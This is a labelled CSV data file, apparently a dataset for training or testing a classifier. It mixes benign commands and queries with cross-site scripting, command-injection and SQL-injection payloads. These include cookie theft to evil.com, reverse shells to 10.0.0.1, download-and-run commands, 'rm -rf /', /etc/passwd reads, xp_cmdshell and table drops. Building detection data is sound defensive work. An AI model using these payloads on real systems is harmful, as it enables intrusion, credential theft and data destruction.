id,payload,label
676,<iframe src='javascript:alert(`xss`)'></iframe>,xss
677,<iframe src='javascript:alert(`xss`)'></iframe>,xss
678,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
679,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
680,<input onfocus=write(1) autofocus>,xss
681,<iframe src='javascript:alert(`xss`)'></iframe>,xss
682,<iframe src='javascript:alert(`xss`)'></iframe>,xss
683,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
684,javascript:alert(document.domain),xss
685,<svg onload=alert(1)>,xss
686,<script>alert(document.cookie)</script>,xss
687,<input onfocus=write(1) autofocus>,xss
688,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
689,<img src=x onerror=alert('XSS')>,xss
690,<svg onload=alert(1)>,xss
691,| cat /etc/passwd,cmd_injection
692,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
693,| cat /etc/passwd,cmd_injection
694,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
695,|| echo 'evil' > script.sh,cmd_injection
696,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
697,| cat /etc/passwd,cmd_injection
698,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
699,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
700,; wget http://malicious.com/shell.php,cmd_injection
701,SELECT price FROM items WHERE id = 209,benign
702,docker run nginx,benign
703,git clone https://github.com/user/repo.git,benign
704,SELECT price FROM items WHERE id = 209,benign
705,SELECT price FROM items WHERE id = 209,benign
706,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
707,git clone https://github.com/user/repo.git,benign
708,curl -I https://api.example.com/status,benign
709,git clone https://github.com/user/repo.git,benign
710,docker run nginx,benign
711,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
712,git clone https://github.com/user/repo.git,benign
713,"<div class='user-profile'>Welcome back, {username}!</div>",benign
714,curl -I https://api.example.com/status,benign
715,git clone https://github.com/user/repo.git,benign
716,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
717,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
718,SELECT price FROM items WHERE id = 209,benign
719,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
720,SELECT price FROM items WHERE id = 209,benign
721,curl -I https://api.example.com/status,benign
722,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
723,curl -I https://api.example.com/status,benign
724,"<div class='user-profile'>Welcome back, {username}!</div>",benign
725,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
726,SELECT price FROM items WHERE id = 209,benign
727,curl -I https://api.example.com/status,benign
728,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
729,docker run nginx,benign
730,curl -I https://api.example.com/status,benign
731,SELECT price FROM items WHERE id = 209,benign
732,"<div class='user-profile'>Welcome back, {username}!</div>",benign
733,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
734,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
735,git clone https://github.com/user/repo.git,benign
736,SELECT price FROM items WHERE id = 209,benign
737,"<div class='user-profile'>Welcome back, {username}!</div>",benign
738,git clone https://github.com/user/repo.git,benign
739,curl -I https://api.example.com/status,benign
740,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
741,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
742,git clone https://github.com/user/repo.git,benign
743,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
744,docker run nginx,benign
745,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
746,SELECT price FROM items WHERE id = 209,benign
747,git clone https://github.com/user/repo.git,benign
748,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
749,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
750,npm install express,benign
751,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
752,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
753,git clone https://github.com/user/repo.git,benign
754,SELECT price FROM items WHERE id = 209,benign
755,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
756,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
757,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
758,SELECT price FROM items WHERE id = 209,benign
759,"<div class='user-profile'>Welcome back, {username}!</div>",benign
760,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
761,'; DROP TABLE users; --,sql_injection
762,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
763,'; WAITFOR DELAY '0:0:10'--,sql_injection
764,"' UNION SELECT username,password FROM admin_users --",sql_injection
765,'; exec xp_cmdshell('net user'); --,sql_injection
766,"' UNION SELECT username,password FROM admin_users --",sql_injection
767,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
768,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
769,' OR 1=1 ORDER BY 1--,sql_injection
770,')) OR 1=1--,sql_injection
771,')) OR 1=1--,sql_injection
772,'; exec xp_cmdshell('net user'); --,sql_injection
773,'; DROP TABLE users; --,sql_injection
774,'; WAITFOR DELAY '0:0:10'--,sql_injection
775,'; exec xp_cmdshell('net user'); --,sql_injection
776,<iframe src='javascript:alert(`xss`)'></iframe>,xss
777,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
778,<svg onload=alert(1)>,xss
779,<body onload=alert('XSS')>,xss
780,<body onload=alert('XSS')>,xss
781,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
782,<iframe src='javascript:alert(`xss`)'></iframe>,xss
783,<body onload=alert('XSS')>,xss
784,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
785,<script>alert(document.cookie)</script>,xss
786,<body onload=alert('XSS')>,xss
787,<body onload=alert('XSS')>,xss
788,<input onfocus=write(1) autofocus>,xss
789,<img src=x onerror=alert('XSS')>,xss
790,<script>alert(document.cookie)</script>,xss
791,|| echo 'evil' > script.sh,cmd_injection
792,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
793,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
794,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
795,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
796,; rm -rf /,cmd_injection
797,|| echo 'evil' > script.sh,cmd_injection
798,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
799,& net user administrator /add,cmd_injection
800,|| echo 'evil' > script.sh,cmd_injection
801,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
802,npm install express,benign
803,curl -I https://api.example.com/status,benign
804,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
805,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
806,SELECT price FROM items WHERE id = 209,benign
807,git clone https://github.com/user/repo.git,benign
808,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
809,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
810,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
811,npm install express,benign
812,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
813,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
814,curl -I https://api.example.com/status,benign
815,docker run nginx,benign
816,git clone https://github.com/user/repo.git,benign
817,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
818,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
819,curl -I https://api.example.com/status,benign
820,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
821,SELECT price FROM items WHERE id = 209,benign
822,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
823,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
824,curl -I https://api.example.com/status,benign
825,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
826,SELECT price FROM items WHERE id = 209,benign
827,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
828,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
829,git clone https://github.com/user/repo.git,benign
830,SELECT price FROM items WHERE id = 209,benign
831,docker run nginx,benign
832,git clone https://github.com/user/repo.git,benign
833,docker run nginx,benign
834,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
835,docker run nginx,benign
836,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
837,curl -I https://api.example.com/status,benign
838,"<div class='user-profile'>Welcome back, {username}!</div>",benign
839,SELECT price FROM items WHERE id = 209,benign
840,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
841,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
842,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
843,"<div class='user-profile'>Welcome back, {username}!</div>",benign
844,docker run nginx,benign
845,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
846,"<div class='user-profile'>Welcome back, {username}!</div>",benign
847,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
848,SELECT price FROM items WHERE id = 209,benign
849,git clone https://github.com/user/repo.git,benign
850,"<div class='user-profile'>Welcome back, {username}!</div>",benign
851,git clone https://github.com/user/repo.git,benign
852,git clone https://github.com/user/repo.git,benign
853,docker run nginx,benign
854,curl -I https://api.example.com/status,benign
855,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
856,git clone https://github.com/user/repo.git,benign
857,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
858,curl -I https://api.example.com/status,benign
859,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
860,SELECT price FROM items WHERE id = 209,benign
861,'; WAITFOR DELAY '0:0:10'--,sql_injection
862,' OR '1'='1,sql_injection
863,'; exec xp_cmdshell('net user'); --,sql_injection
864,'; exec xp_cmdshell('net user'); --,sql_injection
865,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
866,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
867,' OR 1=1 ORDER BY 1--,sql_injection
868,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
869,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
870,'; DROP TABLE users; --,sql_injection
871,'; exec xp_cmdshell('net user'); --,sql_injection
872,'; WAITFOR DELAY '0:0:10'--,sql_injection
873,admin' --,sql_injection
874,' OR '1'='1,sql_injection
875,' OR 1=1 ORDER BY 1--,sql_injection
876,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
877,<iframe src='javascript:alert(`xss`)'></iframe>,xss
878,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
879,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
880,<script>alert(document.cookie)</script>,xss
881,<body onload=alert('XSS')>,xss
882,javascript:alert(document.domain),xss
883,<iframe src='javascript:alert(`xss`)'></iframe>,xss
884,<script>alert(document.cookie)</script>,xss
885,<body onload=alert('XSS')>,xss
886,javascript:alert(document.domain),xss
887,<script>alert(document.cookie)</script>,xss
888,<input onfocus=write(1) autofocus>,xss
889,<script>alert(document.cookie)</script>,xss
890,<svg onload=alert(1)>,xss
891,; wget http://malicious.com/shell.php,cmd_injection
892,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
893,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
894,; wget http://malicious.com/shell.php,cmd_injection
895,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
896,`curl http://evil.com/script.sh | sh`,cmd_injection
897,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
898,`curl http://evil.com/script.sh | sh`,cmd_injection
899,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
900,`curl http://evil.com/script.sh | sh`,cmd_injection
901,npm install express,benign
902,curl -I https://api.example.com/status,benign
903,docker run nginx,benign
904,git clone https://github.com/user/repo.git,benign
905,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
906,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
907,"<div class='user-profile'>Welcome back, {username}!</div>",benign
908,npm install express,benign
909,docker run nginx,benign
910,"<div class='user-profile'>Welcome back, {username}!</div>",benign
911,"<div class='user-profile'>Welcome back, {username}!</div>",benign
912,"<div class='user-profile'>Welcome back, {username}!</div>",benign
913,docker run nginx,benign
914,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
915,"<div class='user-profile'>Welcome back, {username}!</div>",benign
916,"<div class='user-profile'>Welcome back, {username}!</div>",benign
917,"<div class='user-profile'>Welcome back, {username}!</div>",benign
918,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
919,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
920,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
921,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
922,curl -I https://api.example.com/status,benign
923,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
924,SELECT price FROM items WHERE id = 209,benign
925,"<div class='user-profile'>Welcome back, {username}!</div>",benign
926,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
927,"<div class='user-profile'>Welcome back, {username}!</div>",benign
928,git clone https://github.com/user/repo.git,benign
929,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
930,"<div class='user-profile'>Welcome back, {username}!</div>",benign
931,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
932,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
933,git clone https://github.com/user/repo.git,benign
934,git clone https://github.com/user/repo.git,benign
935,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
936,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
937,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
938,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
939,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
940,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
941,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
942,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
943,npm install express,benign
944,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
945,SELECT price FROM items WHERE id = 209,benign
946,git clone https://github.com/user/repo.git,benign
947,docker run nginx,benign
948,git clone https://github.com/user/repo.git,benign
949,npm install express,benign
950,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
951,curl -I https://api.example.com/status,benign
952,"<div class='user-profile'>Welcome back, {username}!</div>",benign
953,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
954,"<div class='user-profile'>Welcome back, {username}!</div>",benign
955,git clone https://github.com/user/repo.git,benign
956,git clone https://github.com/user/repo.git,benign
957,SELECT price FROM items WHERE id = 209,benign
958,npm install express,benign
959,"<div class='user-profile'>Welcome back, {username}!</div>",benign
960,curl -I https://api.example.com/status,benign
961,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
962,' OR 1=1 ORDER BY 1--,sql_injection
963,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
964,'; WAITFOR DELAY '0:0:10'--,sql_injection
965,')) OR 1=1--,sql_injection
966,'; exec xp_cmdshell('net user'); --,sql_injection
967,'; WAITFOR DELAY '0:0:10'--,sql_injection
968,'; exec xp_cmdshell('net user'); --,sql_injection
969,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
970,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
971,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
972,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
973,' OR '1'='1,sql_injection
974,admin' --,sql_injection
975,'; DROP TABLE users; --,sql_injection
976,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
977,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
978,<svg onload=alert(1)>,xss
979,<input onfocus=write(1) autofocus>,xss
980,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
981,<input onfocus=write(1) autofocus>,xss
982,javascript:alert(document.domain),xss
983,<img src=x onerror=alert('XSS')>,xss
984,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
985,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
986,<script>alert(document.cookie)</script>,xss
987,<img src=x onerror=alert('XSS')>,xss
988,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
989,<img src=x onerror=alert('XSS')>,xss
990,<body onload=alert('XSS')>,xss
991,| cat /etc/passwd,cmd_injection
992,; rm -rf /,cmd_injection
993,|| echo 'evil' > script.sh,cmd_injection
994,; wget http://malicious.com/shell.php,cmd_injection
995,|| echo 'evil' > script.sh,cmd_injection
996,| cat /etc/passwd,cmd_injection
997,& net user administrator /add,cmd_injection
998,`curl http://evil.com/script.sh | sh`,cmd_injection
999,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
1000,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
